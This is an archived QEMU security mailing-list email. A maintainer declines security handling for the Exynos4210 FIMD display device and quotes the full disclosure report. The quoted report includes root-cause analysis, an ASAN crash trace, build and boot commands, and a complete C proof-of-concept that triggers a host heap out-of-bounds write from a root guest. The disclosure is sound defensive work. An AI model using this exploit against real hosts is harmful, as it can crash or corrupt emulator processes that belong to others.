Return-Path: <qemu-arm-bounces+qemu-arm=archiver.kernel.org@nongnu.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists1p.gnu.org (lists1p.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 53F4FCD3427
	for <qemu-arm@archiver.kernel.org>; Mon, 11 May 2026 09:53:50 +0000 (UTC)
Received: from localhost ([::1] helo=lists1p.gnu.org)
	by lists1p.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-arm-bounces@nongnu.org>)
	id 1wMNKJ-00065o-RW; Mon, 11 May 2026 05:53:30 -0400
Received: from eggs.gnu.org ([2001:470:142:3::10])
 by lists1p.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <berrange@redhat.com>)
 id 1wMNK5-0005tY-WA
 for qemu-arm@nongnu.org; Mon, 11 May 2026 05:53:17 -0400
Received: from us-smtp-delivery-124.mimecast.com ([170.10.129.124])
 by eggs.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <berrange@redhat.com>)
 id 1wMNK2-0004an-IP
 for qemu-arm@nongnu.org; Mon, 11 May 2026 05:53:13 -0400
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
 s=mimecast20190719; t=1778493189;
 h=from:from:reply-to:reply-to:subject:subject:date:date:
 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
 content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=CKgexJW6jzcX+nTJ1wSC1JdmEYHaSShzrBup7tvfxM0=;
 b=MT4eUWxDvnU51XG2pGsQeN5gl0HB9gAbbDFNMObcBKiPrXpt/+wc0uMJRaLuyfwJ6D7mHM
 sNztcRshG29RXW7TDnMBf0Rh9Y3aK38jbeRHa0xKQMV5/pxoQ9Sa8gz7v7W3sQsqRL2TDV
 Wzyiu22IjSjalvOjpw2q5YUKwpGnZCA=
Received: from mx-prod-mc-05.mail-002.prod.us-west-2.aws.redhat.com
 (ec2-54-186-198-63.us-west-2.compute.amazonaws.com [54.186.198.63]) by
 relay.mimecast.com with ESMTP with STARTTLS (version=TLSv1.3,
 cipher=TLS_AES_256_GCM_SHA384) id us-mta-554-dmDAemYKPQOk0n0Y2D4z0Q-1; Mon,
 11 May 2026 05:15:04 -0400
X-MC-Unique: dmDAemYKPQOk0n0Y2D4z0Q-1
X-Mimecast-MFC-AGG-ID: dmDAemYKPQOk0n0Y2D4z0Q_1778490903
Received: from mx-prod-int-03.mail-002.prod.us-west-2.aws.redhat.com
 (mx-prod-int-03.mail-002.prod.us-west-2.aws.redhat.com [10.30.177.12])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by mx-prod-mc-05.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTPS
 id 2C5D3195608D; Mon, 11 May 2026 09:15:03 +0000 (UTC)
Received: from redhat.com (unknown [10.44.50.30])
 by mx-prod-int-03.mail-002.prod.us-west-2.aws.redhat.com (Postfix) with ESMTPS
 id D9EF219560A2; Mon, 11 May 2026 09:15:00 +0000 (UTC)
Date: Mon, 11 May 2026 10:14:57 +0100
From: Daniel =?utf-8?B?UC4gQmVycmFuZ8Op?= <berrange@redhat.com>
To: bestswngs@gmail.com
Cc: qemu-security@nongnu.org, Igor Mitsyanko <i.mitsyanko@gmail.com>,
 Peter Maydell <peter.maydell@linaro.org>, qemu-arm@nongnu.org
Subject: Re: [QEMU-SECURITY] [BUG] hw/display/exynos4210_fimd:
 guest-triggerable host heap OOB write via unchecked window coordinates
Message-ID: <agGeEVCUXGi8JdOu@redhat.com>
References: <agBHWKJmtNcrQBXe@Air.local>
MIME-Version: 1.0
In-Reply-To: <agBHWKJmtNcrQBXe@Air.local>
User-Agent: Mutt/2.3.1 (2026-03-20)
X-Scanned-By: MIMEDefang 3.0 on 10.30.177.12
X-Mimecast-Spam-Score: 0
X-Mimecast-MFC-PROC-ID: iC8vSxl-5c2SHloVkwDKd4PZqa9Y9eNQehVKFXukun4_1778490903
X-Mimecast-Originator: redhat.com
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
Received-SPF: pass client-ip=170.10.129.124; envelope-from=berrange@redhat.com;
 helo=us-smtp-delivery-124.mimecast.com
X-Spam_score_int: -24
X-Spam_score: -2.5
X-Spam_bar: --
X-Spam_report: (-2.5 / 5.0 requ) BAYES_00=-1.9, DKIMWL_WL_HIGH=-0.445,
 DKIM_SIGNED=0.1, DKIM_VALID=-0.1, DKIM_VALID_AU=-0.1, DKIM_VALID_EF=-0.1,
 RCVD_IN_DNSWL_NONE=-0.0001, RCVD_IN_MSPIKE_H4=0.001, RCVD_IN_MSPIKE_WL=0.001,
 SPF_HELO_PASS=-0.001, SPF_PASS=-0.001,
 WEIRD_PORT=0.001 autolearn=ham autolearn_force=no
X-Spam_action: no action
X-BeenThere: qemu-arm@nongnu.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: <qemu-arm.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-arm>,
 <mailto:qemu-arm-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-arm>
List-Post: <mailto:qemu-arm@nongnu.org>
List-Help: <mailto:qemu-arm-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-arm>,
 <mailto:qemu-arm-request@nongnu.org?subject=subscribe>
Reply-To: Daniel =?utf-8?B?UC4gQmVycmFuZ8Op?= <berrange@redhat.com>
Errors-To: qemu-arm-bounces+qemu-arm=archiver.kernel.org@nongnu.org
Sender: qemu-arm-bounces+qemu-arm=archiver.kernel.org@nongnu.org

Hi,

Thankyou for your report, however, the exynos4210 device is classed
under the "non-virtualization use case":

  https://www.qemu.org/docs/master/system/security.html#non-virtualization-use-case

Thus we don't apply the security process to issues in this device and
it is not eligible for CVE assignment.

This bug can be reported in the public QEMU gitlab.com issue tracker
and/or patches sent straight to qemu-devel mailing list publically.


On Sun, May 10, 2026 at 04:52:40PM +0800, bestswngs@gmail.com wrote:
> Hi,
> 
> I'd like to report a guest-triggerable host heap out-of-bounds write
> in the Exynos4210 FIMD display controller emulation.  It is reachable
> from any process running with root privilege inside a smdkc210/nuri
> guest, through ordinary /dev/mem mmap of the FIMD MMIO region.  No
> out-of-spec register values are required; all writes are within the
> device's own mask range.
> 
> Verified against QEMU 10.0.0; the relevant code in master
> (HEAD ee7eb612) is byte-identical for all four root-cause spots
> referenced below, so master is expected to reproduce identically.
> 
> 
> == TL;DR ==
> 
> The internal frame buffer s->ifb is sized from the global LCD
> resolution in VIDTCON2.  However, fimd_update() then uses each
> window's own (lefttop_x, lefttop_y) coordinates to compute a pixel
> destination inside s->ifb, with no check that the window stays inside
> the global rectangle.  Because both the global size and the window
> coordinates are 11-bit guest-writable fields with no cross-validation,
> the guest can shrink s->ifb to 14,337 bytes while pointing window 0
> at byte offset 0x01BFC800 (~ 28 MB) past the allocation.  This
> results in put_pixel_ifb() performing 7-byte writes (3 RGB bytes plus
> a 4-byte alpha word; RGBA_SIZE == 7) far outside the heap chunk.
> 
> 
> == Build requirements ==
> 
> None special.  CONFIG_EXYNOS4 is `default y` in hw/arm/Kconfig and is
> included in every stock qemu-system-arm distribution package.  A
> release-mode build (no debug, no sanitizer) reproduces the crash with
> exit status 139 (SIGSEGV); the ASAN trace below merely gives a
> clearer view of the same fault.  No KVM is involved — pure TCG on
> any host arch.
> 
> 
> == Triggerability ==
> 
>   Guest userspace (root + /dev/mem): YES — demonstrated below with a
>                                     full Debian 4.19 ARM Linux boot
>                                     and a freestanding C PoC running
>                                     as /init.  Note this works *even
>                                     with* CONFIG_STRICT_DEVMEM=y in
>                                     the guest kernel: the FIMD MMIO
>                                     region is iomem, not RAM, so
>                                     /dev/mem still allows mmap on it.
>   Guest kernel module (root):        YES — same MMIO dispatch path via
>                                     ioremap() + writel(); the
>                                     userspace PoC already proves the
>                                     host write path, kernel mode is
>                                     strictly easier.
>   Guest userspace (unprivileged):    Indirect; gated by Linux fbdev
>                                     driver (s3c-fb.c) which validates
>                                     geometry. Not directly reachable
>                                     from non-root users.
> 
> All bug-relevant register writes use values within the device's own
> mask range (FIMD_VIDOSD_COORD_MASK = 0x7ff); no out-of-spec input is
> needed.  Threat model is "untrusted code with root or kernel
> privilege inside a smdkc210/nuri guest" — typical of CI / firmware-
> test environments that emulate Samsung Exynos4 boards.
> 
> 
> == Root cause ==
> 
> In hw/display/exynos4210_fimd.c, four pieces of state diverge:
> 
> 1) s->ifb is allocated using only the *global* width/height from
>    VIDTCON2.  RGBA_SIZE is 7 (3 bytes RGB + 4-byte alpha word; rgba
>    struct at line 258, define at line 264):
> 
>      [hw/display/exynos4210_fimd.c:1245]
>      static void exynos4210_update_resolution(Exynos4210fimdState *s)
>      {
>          /* HOR_SHIFT=0, VER_SHIFT=11, MASK=0x7ff (lines 80-82)        */
>          uint32_t width  = ((s->vidtcon[2] >> FIMD_VIDTCON2_HOR_SHIFT) & 0x7ff) + 1;
>          uint32_t height = ((s->vidtcon[2] >> FIMD_VIDTCON2_VER_SHIFT) & 0x7ff) + 1;
> 
>          if (s->ifb == NULL || ...) {
>              qemu_console_resize(s->console, width, height);
>              s->ifb = g_realloc(s->ifb, width * height * RGBA_SIZE + 1);
>              memset(s->ifb, 0, width * height * RGBA_SIZE + 1);
>          }
>      }
> 
> 2) Each window's lefttop_x / lefttop_y are 11-bit guest-writable
>    values with no clamp against the global rectangle.  HOR_SHIFT=11,
>    VER_SHIFT=0, COORD_MASK=0x7ff:
> 
>      [hw/display/exynos4210_fimd.c:1457]
>      case FIMD_VIDOSD_START ... FIMD_VIDOSD_END:           /* 0x40..0x88 */
>          ...
>          s->window[w].lefttop_x = (val >> FIMD_VIDOSD_HOR_SHIFT) & FIMD_VIDOSD_COORD_MASK;
>          s->window[w].lefttop_y = (val >> FIMD_VIDOSD_VER_SHIFT) & FIMD_VIDOSD_COORD_MASK;
>          /* both axes accept the full 0..2047 range */
> 
> 3) fimd_update() walks each enabled window and indexes into s->ifb
>    using lefttop_x / lefttop_y, never checking against global_width:
> 
>      [hw/display/exynos4210_fimd.c:1286]
>      global_width = (s->vidtcon[2] & FIMD_VIDTCON2_SIZE_MASK) + 1;
>      ...
>      for (i = 0; i < NUM_OF_WINDOWS; i++) {
>          w = &s->window[i];
>          if ((w->wincon & FIMD_WINCON_ENWIN) && w->host_fb_addr) {
>              scrn_height = w->rightbot_y - w->lefttop_y + 1;
>              ...
>              for (line = 0; line < scrn_height; line++) {
>                  ...
>                  w->draw_line(w, host_fb_addr,
>                               s->ifb +
>                               w->lefttop_x * RGBA_SIZE +
>                               (w->lefttop_y + line) * global_width *
>                               RGBA_SIZE,
>                               blend);
> 
> The pointer passed as `dst` to the per-window draw_line callback is
> then written by put_pixel_ifb():
> 
>     [hw/display/exynos4210_fimd.c:475]
>     static int put_pixel_ifb(const rgba p, uint8_t *d)
>     {
>         *(uint8_t *)d++ = p.r;        /* <-- ASAN reports the SEGV here */
>         *(uint8_t *)d++ = p.g;
>         *(uint8_t *)d++ = p.b;
>         *(uint32_t *)d  = p.a;        /* 4-byte store of the alpha word */
>         return RGBA_SIZE;             /* RGBA_SIZE == 7                 */
>     }
> 
> 4) WINMAP0 is what triggers the redraw.  Writing 0x01000000 sets bit
>    24 (FIMD_WINMAP_EN), the EN-bit XOR is non-zero, and fimd_update()
>    is called.  With WINMAP_EN set, update_win_bppmode() switches the
>    per-window draw_line callback to draw_line_mapcolor, which
>    synthesizes each pixel from the low 24 bits of the winmap register
>    and does NOT read guest framebuffer RAM at all -- so guest RAM
>    contents are irrelevant to triggering the bug:
> 
>      [hw/display/exynos4210_fimd.c:1551]
>      case FIMD_WINMAP_START ... FIMD_WINMAP_END:           /* 0x180..0x190 */
>          w = (offset - FIMD_WINMAP_START) >> 2;
>          old_value = s->window[w].winmap;
>          s->window[w].winmap = val;
>          if ((val & FIMD_WINMAP_EN) ^ (old_value & FIMD_WINMAP_EN)) {
>              exynos4210_fimd_invalidate(s);
>              exynos4210_fimd_update_win_bppmode(s, w);
>              ...
>              exynos4210_fimd_update(s);                  /* <-- triggers it */
>          }
> 
> 
> == Arithmetic of the OOB ==
> 
>   VIDTCON2 = 0x000007ff           HOR_SHIFT=0, VER_SHIFT=11, MASK=0x7ff
>     -> global_width  = ((0x7ff >> 0)  & 0x7ff) + 1 = 0x800  (2048)
>     -> global_height = ((0x7ff >> 11) & 0x7ff) + 1 = 0x001  (1)
>   ifb size = 2048 * 1 * 7 + 1 = 14,337 bytes (0x3801)
> 
>   VIDOSDA0 = 0x000007ff           HOR_SHIFT=11, VER_SHIFT=0, MASK=0x7ff
>     -> lefttop_x = (0x7ff >> 11) & 0x7ff = 0
>     -> lefttop_y = (0x7ff >>  0) & 0x7ff = 0x7ff (2047)
>   VIDOSDB0 = 0x000007ff
>     -> rightbot_x = 0, rightbot_y = 0x7ff
> 
>   For window 0:
>     scrn_height = rightbot_y - lefttop_y + 1 = 1
>     scrn_width  = w->virtpage_width             (= 0 by default)
> 
>   The 1-line, 1-pixel write goes to:
> 
>     ifb_offset = lefttop_x * RGBA_SIZE
>                + (lefttop_y + 0) * global_width * RGBA_SIZE
>                = 0 * 7
>                + 0x7ff * 0x800 * 7
>                = 0 + 0x3FF800 * 7
>                = 0x01BFC800             (29,345,792 bytes ~= 28 MB)
> 
>   ifb has been deliberately shrunk to 14,337 bytes (0x3801), so
>   0x01BFC800 lands ~28 MB past the end of the heap chunk, deep into
>   unmapped territory.  The very first byte store inside put_pixel_ifb()
>   faults.  Consistent with the observed ASAN report below:
> 
>     SEGV at 0x528001bfc900
>     ifb base ~= 0x528000000100   (heap chunk, glibc fastbin)
>     crash offset = 0x01bfc900 - 0x000000100 ~= 0x01BFC800   verified.
> 
> 
> == Reproducer (full Linux guest userspace, root via /dev/mem) ==
> 
> The PoC is a freestanding ARM Linux init binary (single C file, no
> libc, ~4 KB static ELF) that mmap()s /dev/mem and writes the FIMD
> MMIO sequence described above.  It runs as PID 1 in a busybox
> initramfs.
> 
> For convenience the PoC reuses the exact kernel / DTB / rootfs
> already used by QEMU's own functional test, so anyone running
> `make check-functional-arm` already has the artifacts on disk:
> 
>   Test:    tests/functional/test_arm_smdkc210.py
>   Kernel:  linux-image-4.19.0-6-armmp_4.19.67-2+deb10u1_armhf.deb
>            (Debian snapshot, provides vmlinuz + exynos4210-smdkv310.dtb)
>   Rootfs:  rootfs-armv5.cpio.gz from groeck/linux-build-test
>   Hardening note: that kernel has CONFIG_STRICT_DEVMEM=y; the bug is
>   still reachable because /dev/mem allows mapping iomem / MMIO even
>   when DRAM access is blocked.
> 
> Build the PoC (source attached below) and stage it as /init:
> 
>   arm-linux-gnu-gcc -nostdlib -static -mcpu=cortex-a9 -marm \
>       -ffreestanding -fno-stack-protector -o init poc.c
>   # then place `init` at the root of a copy of rootfs-armv5.cpio.gz
> 
> Boot (TCG, release build, no qtest, no debug):
> 
>   qemu-system-arm -M smdkc210 -m 256M -nographic -nodefaults \
>       -display none -kernel <vmlinuz> -dtb <dtb> -initrd <cpio> \
>       -append 'console=ttySAC0,115200n8 panic=-1 noreboot rdinit=/init' \
>       -serial mon:stdio -accel tcg
> 
> 
> == ASAN evidence ==
> 
> Console output and ASAN trace from a representative run.  Note that
> Thread T2 is the TCG vCPU worker, not the main thread, and the
> bottom of the stack is helper_stl_mmu / (tcg-jit) — i.e. a guest ARM
> `str` instruction translated by TCG, not a host-side write:
> 
> ```	
>   / # ./init
> 
>     AddressSanitizer:DEADLYSIGNAL
>     =================================================================
>     ==163255==ERROR: AddressSanitizer: SEGV on unknown address 0x528001bfc900 (pc 0x55d8a00356ff bp 0x7fa55f5fd670 sp 0x7fa55f5fd580 T2)
>     ==163255==The signal is caused by a WRITE memory access.
>         #0 0x55d8a00356ff in put_pixel_ifb ../hw/display/exynos4210_fimd.c:477
>         #1 0x55d8a00356ff in draw_line_mapcolor ../hw/display/exynos4210_fimd.c:862
>         #2 0x55d8a002f5e8 in exynos4210_fimd_update ../hw/display/exynos4210_fimd.c:1311
>         #3 0x55d8a00303ec in exynos4210_fimd_write ../hw/display/exynos4210_fimd.c:1559
>         #4 0x55d8a0ade71b in memory_region_write_accessor ../system/memory.c:497
>         #5 0x55d8a0add43b in access_with_adjusted_size ../system/memory.c:573
>         #6 0x55d8a0addd09 in memory_region_dispatch_write ../system/memory.c:1553
>         #7 0x55d8a0b457dd in int_st_mmio_leN ../accel/tcg/cputlb.c:2493
>         #8 0x55d8a0b461ba in do_st_mmio_leN ../accel/tcg/cputlb.c:2528
>         #9 0x55d8a0b5193c in do_st_4 ../accel/tcg/cputlb.c:2698
>         #10 0x55d8a0b5193c in do_st4_mmu ../accel/tcg/cputlb.c:2774
>         #11 0x55d8a0b54e7b in helper_stl_mmu ../accel/tcg/ldst_common.c.inc:100
>         #12 0x7fa5a1661bed  (/memfd:tcg-jit (deleted)+0x1d6bbed)
>     
>     AddressSanitizer can not provide additional info.
>     SUMMARY: AddressSanitizer: SEGV ../hw/display/exynos4210_fimd.c:477 in put_pixel_ifb
>     Thread T2 created by T0 here:
>         #0 0x7fa624af40a3 in pthread_create (/lib64/libasan.so.8+0xf40a3) (BuildId: 056be1fcf267a221be3234b7611a94d0ee6a19bc)
>         #1 0x55d8a0f87c6b in qemu_thread_create ../util/qemu-thread-posix.c:581
>         #2 0x55d8a06f1640 in mttcg_start_vcpu_thread ../accel/tcg/tcg-accel-ops-mttcg.c:143
>         #3 0x55d8a05db992 in qemu_init_vcpu ../system/cpus.c:705
>         #4 0x55d8a084713f in arm_cpu_realizefn ../target/arm/cpu.c:2602
>         #5 0x55d8a0b712bb in device_set_realized ../hw/core/qdev.c:494
>         #6 0x55d8a0b7913b in property_set_bool ../qom/object.c:2374
>         #7 0x55d8a0b7f674 in object_property_set ../qom/object.c:1449
>         #8 0x55d8a0b85e37 in object_property_set_qobject ../qom/qom-qobject.c:28
>         #9 0x55d8a0b7face in object_property_set_bool ../qom/object.c:1519
>         #10 0x55d8a0b701a5 in qdev_realize ../hw/core/qdev.c:276
>         #11 0x55d8a07d21bf in exynos4210_realize ../hw/arm/exynos4210.c:577
>         #12 0x55d8a0b712bb in device_set_realized ../hw/core/qdev.c:494
>         #13 0x55d8a0b7913b in property_set_bool ../qom/object.c:2374
>         #14 0x55d8a0b7f674 in object_property_set ../qom/object.c:1449
>         #15 0x55d8a0b85e37 in object_property_set_qobject ../qom/qom-qobject.c:28
>         #16 0x55d8a0b7face in object_property_set_bool ../qom/object.c:1519
>         #17 0x55d8a0b701a5 in qdev_realize ../hw/core/qdev.c:276
>         #18 0x55d89ff8fec3 in sysbus_realize ../hw/core/sysbus.c:238
>         #19 0x55d8a0597d76 in exynos4_boards_init_common ../hw/arm/exynos4_boards.c:129
>         #20 0x55d8a0597e55 in smdkc210_init ../hw/arm/exynos4_boards.c:144
>         #21 0x55d89ff821fd in machine_run_board_init ../hw/core/machine.c:1682
>         #22 0x55d8a05f8c62 in qemu_init_board ../system/vl.c:2711
>         #23 0x55d8a05f8c62 in qmp_x_exit_preconfig ../system/vl.c:2807
>         #24 0x55d8a05ff76b in qemu_init ../system/vl.c:3843
>         #25 0x55d8a0e207dd in main ../system/main.c:71
>         #26 0x7fa62403c58d in __libc_start_call_main (/lib64/libc.so.6+0x2a58d) (BuildId: 1e3e48dbffd641e15d0c912086334c9e3436917c)
>     
>     ==163255==ABORTING
> ```
> 
> == Disclosure ==
> 
> Found during an audit of QEMU 10.0.0.  I'm happy to coordinate
> disclosure or send a fix patch — let me know your preference.
> 
> Thanks,
> 
> Weiming Shi (swing) && 章鱼哥@aipy (www.aipyaipy.com)
> 
> --
> QEMU 10.0.0 build used for the ASAN evidence above:
> 
>   ../configure --target-list=arm-softmmu --enable-debug \
>                --extra-cflags="-fsanitize=address -O1 -g" \
>                --extra-ldflags="-fsanitize=address" \
>                --disable-werror
> 
> Boot:
> 
>     qemu-system-arm -M smdkc210 -m 256M -nographic -nodefaults -display none \
>         -kernel ./boot/vmlinuz-4.19.0-6-armmp \
>         -dtb    ./usr/lib/linux-image-4.19.0-6-armmp/exynos4210-smdkv310.dtb \
>         -initrd ./rootfs-poc.cpio.gz \
>         -append 'earlycon=exynos4210,0x13800000 console=ttySAC0,115200n8
>                  panic=-1 noreboot rdinit=/init' \
>         -serial mon:stdio -accel tcg
> 
> 
> ==============================================================================
> Attachment: poc.c   (freestanding ARM Linux userspace, no libc, ~4 KB ELF)
> ==============================================================================
> /* Userspace ARM Linux PoC for the Exynos4210 FIMD ifb OOB write bug.
>  * Freestanding (no libc); issues syscalls via inline svc 0 (EABI).
>  * Build:
>  *   arm-linux-gnu-gcc -nostdlib -static -O0 -mcpu=cortex-a9 -marm \
>  *       -ffreestanding -fno-stack-protector -o poc poc.c
>  * Use as /init in any minimal initramfs.
>  */
> typedef unsigned int  u32;
> typedef unsigned long ulong;
> 
> #define O_RDWR        0x00000002
> #define O_SYNC        0x00101000
> #define PROT_READ     0x1
> #define PROT_WRITE    0x2
> #define MAP_SHARED    0x01
> #define MAP_FAILED    ((void *)-1L)
> 
> #define SYS_exit      1
> #define SYS_write     4
> #define SYS_open      5
> #define SYS_mount     21
> #define SYS_reboot    88
> #define SYS_mmap2     192   /* offset is in PAGE_SIZE units */
> 
> #define LINUX_REBOOT_MAGIC1 0xfee1deadu
> #define LINUX_REBOOT_MAGIC2 672274793u
> #define LINUX_REBOOT_CMD_POWER_OFF 0x4321fedcu
> 
> static inline long syscall1(long n,long a){
>     register long r0 __asm__("r0")=a; register long r7 __asm__("r7")=n;
>     __asm__ volatile("svc 0":"+r"(r0):"r"(r7):"memory"); return r0;
> }
> static inline long syscall2(long n,long a,long b){
>     register long r0 __asm__("r0")=a; register long r1 __asm__("r1")=b;
>     register long r7 __asm__("r7")=n;
>     __asm__ volatile("svc 0":"+r"(r0):"r"(r1),"r"(r7):"memory"); return r0;
> }
> static inline long syscall3(long n,long a,long b,long c){
>     register long r0 __asm__("r0")=a; register long r1 __asm__("r1")=b;
>     register long r2 __asm__("r2")=c; register long r7 __asm__("r7")=n;
>     __asm__ volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory");
>     return r0;
> }
> static inline long syscall4(long n,long a,long b,long c,long d){
>     register long r0 __asm__("r0")=a; register long r1 __asm__("r1")=b;
>     register long r2 __asm__("r2")=c; register long r3 __asm__("r3")=d;
>     register long r7 __asm__("r7")=n;
>     __asm__ volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r3),"r"(r7):"memory");
>     return r0;
> }
> static inline long syscall6(long n,long a,long b,long c,long d,long e,long f){
>     register long r0 __asm__("r0")=a; register long r1 __asm__("r1")=b;
>     register long r2 __asm__("r2")=c; register long r3 __asm__("r3")=d;
>     register long r4 __asm__("r4")=e; register long r5 __asm__("r5")=f;
>     register long r7 __asm__("r7")=n;
>     __asm__ volatile("svc 0":"+r"(r0)
>         :"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5),"r"(r7):"memory");
>     return r0;
> }
> 
> static int   sys_open(const char *p,int f){return syscall2(SYS_open,(long)p,f);}
> static long  sys_write(int fd,const void*b,ulong n){return syscall3(SYS_write,fd,(long)b,n);}
> static void *sys_mmap(void*a,ulong l,int p,int fl,int fd,ulong pg){
>     return (void*)syscall6(SYS_mmap2,(long)a,l,p,fl,fd,pg);
> }
> static int sys_mount(const char*s,const char*t,const char*f,ulong fl,const void*d){
>     register long r0 __asm__("r0")=(long)s; register long r1 __asm__("r1")=(long)t;
>     register long r2 __asm__("r2")=(long)f; register long r3 __asm__("r3")=(long)fl;
>     register long r4 __asm__("r4")=(long)d; register long r7 __asm__("r7")=SYS_mount;
>     __asm__ volatile("svc 0":"+r"(r0)
>         :"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r7):"memory");
>     return r0;
> }
> static int sys_reboot(u32 cmd){
>     return syscall4(SYS_reboot,LINUX_REBOOT_MAGIC1,LINUX_REBOOT_MAGIC2,cmd,0);
> }
> 
> static ulong str_len(const char*s){ulong n=0;while(s[n])n++;return n;}
> static void  putln(const char*s){sys_write(1,s,str_len(s));sys_write(1,"\n",1);}
> static void  puts1(const char*s){sys_write(1,s,str_len(s));}
> static void  puthex(u32 x){
>     char b[11]="0x00000000";
>     for(int i=0;i<8;i++){unsigned d=(x>>((7-i)*4))&0xf;b[2+i]=d<10?'0'+d:'a'+d-10;}
>     sys_write(1,b,10);
> }
> 
> #define FIMD_BASE 0x11c00000UL
> #define FIMD_LEN  0x10000
> #define PAGE_SIZE 4096
> 
> static volatile u32 *fimd;
> static void w32(u32 off,u32 v){
>     fimd[off>>2]=v;
>     __asm__ __volatile__("dsb sy":::"memory");
> }
> 
> void _start(void)
> {
>     putln("");
>     putln("=====================================================================");
>     putln("[poc] Linux userspace running as PID 1 (pure C, no libc)");
>     putln("=====================================================================");
> 
>     puts1("[poc] mount devtmpfs on /dev ... ");
>     if (sys_mount("devtmpfs","/dev","devtmpfs",0,0) < 0)
>         putln("FAILED (continuing -- /dev may already exist)");
>     else putln("ok");
> 
>     puts1("[poc] open /dev/mem ... ");
>     int fd = sys_open("/dev/mem", O_RDWR | O_SYNC);
>     if (fd < 0) { putln("FAILED"); goto die; }
>     putln("ok");
> 
>     puts1("[poc] mmap FIMD at PA 0x11c00000 ... ");
>     void *p = sys_mmap(0, FIMD_LEN, PROT_READ|PROT_WRITE, MAP_SHARED,
>                        fd, FIMD_BASE / PAGE_SIZE);
>     if (p == MAP_FAILED) { putln("FAILED"); goto die; }
>     fimd = (volatile u32*)p;
>     puts1("VA="); puthex((u32)(ulong)p); putln("");
> 
>     putln("[poc] programming FIMD registers.");
>     w32(0x0018, 0x000007ff);   /* VIDTCON2 -> global 2048x1, ifb=14337B */
>     w32(0x00a0, 0x40000080);   /* VIDW0_BUF_START0 (unused with WINMAP) */
>     w32(0x0100, 0x00000008);   /* WINCON0 (ENWIN bit etc.)              */
>     w32(0x0040, 0x000007ff);   /* VIDOSDA0 -> lefttop_y = 0x7ff         */
>     w32(0x0044, 0x000007ff);   /* VIDOSDB0 -> rightbot_y = 0x7ff        */
>     w32(0x0020, 0x0000002d);   /* VIDCON2                               */
>     w32(0x0000, 0x00000003);   /* VIDCON0 enable                        */
> 
>     putln("[poc] firing trigger write (WINMAP0)...");
>     putln("[poc] If host QEMU is vulnerable, this is the LAST line you see:");
> 
>     /* Sets WINMAP_EN=bit24, switches draw_line to draw_line_mapcolor,
>      * triggers fimd_update() -> draw_line -> put_pixel_ifb() at
>      * s->ifb + 0x01BFC800 (28 MB past the 14,337-byte allocation). */
>     w32(0x0180, 0x01000000);
> 
>     putln("[poc] *** host QEMU survived -- bug appears PATCHED ***");
> die:
>     sys_reboot(LINUX_REBOOT_CMD_POWER_OFF);
>     syscall1(SYS_exit, 0);
> }
> 

With regards,
Daniel
-- 
|: https://berrange.com       ~~        https://hachyderm.io/@berrange :|
|: https://libvirt.org          ~~          https://entangle-photo.org :|
|: https://pixelfed.art/berrange   ~~    https://fstop138.berrange.com :|


